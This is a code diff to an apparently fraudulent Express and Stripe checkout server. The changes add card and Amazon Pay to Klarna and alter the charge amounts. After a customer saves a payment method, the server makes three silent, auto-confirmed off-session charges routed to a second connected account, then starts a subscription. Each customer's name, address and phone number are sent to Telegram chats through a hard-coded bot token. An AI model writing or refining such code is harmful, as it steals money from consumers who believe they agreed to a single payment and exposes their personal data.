@@ -5,7 +5,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 
 const app = express();
-const ACCOUNT_B = 'acct_1RURIXJ4lPo0Pf67';
+const ACCOUNT_B = 'acct_1T3gZ4CkwpuywCYb';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -67,7 +67,7 @@ app.post('/create-setup-intent', async (req, res) => {
     }
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['klarna'],
+      payment_method_types: ['klarna', 'card', 'amazon_pay'],
       metadata: { customer_id: customer.id },
     });
 
@@ -78,7 +78,7 @@ app.post('/create-setup-intent', async (req, res) => {
       `👤 Name: ${fname} ${lname}\n` +
       `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
       `📞 Telefon: ${phone || 'N/A'}\n` +
-      `💰 Betrag: €89.00\n` +
+      `💰 Betrag: €179.00\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
@@ -112,14 +112,18 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €499.00
+    // Get payment method type
+    const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
+    const pmType = paymentMethod.type;
+    
+    // Charge 1 — €65.67
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 49900,
+        amount: 6567,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
-        payment_method_types: ['klarna'],
+        payment_method_types: [pmType],
         confirm: true,
         off_session: true,
         transfer_data: { destination: ACCOUNT_B },
@@ -139,7 +143,7 @@ app.post('/create-subscription', async (req, res) => {
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
-        payment_method_types: ['klarna'],
+        payment_method_types: [pmType],
         confirm: true,
         off_session: true,
         transfer_data: { destination: ACCOUNT_B },
@@ -152,14 +156,14 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €599
+    // Charge 3 — €499
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 59900,
+        amount: 49900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
-        payment_method_types: ['klarna'],
+        payment_method_types: [pmType],
         confirm: true,
         off_session: true,
         transfer_data: { destination: ACCOUNT_B },
@@ -172,10 +176,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Subscription with 30-day trial
+    // Subscription with 30-day trial (€179/month)
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1T4hldBzXqhIraFc8FKBeVDj' }],
+      items: [{ price: 'price_1T3wlpEB93pAUPXSQjVBpUgo' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -186,7 +190,8 @@ app.post('/create-subscription', async (req, res) => {
     await sendTelegram(
       `✅ <b>Zahlung erfolgreich!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
-      `💳 Payment 1: €32.67\n` +
+      `💳 Zahlungsart: ${pmType}\n` +
+      `💳 Payment 1: €65.67\n` +
       `💳 Payment 2: €199.00\n` +
       `💳 Payment 3: €499.00\n` +
       `🆔 Subscription: ${subscription.id}\n` +
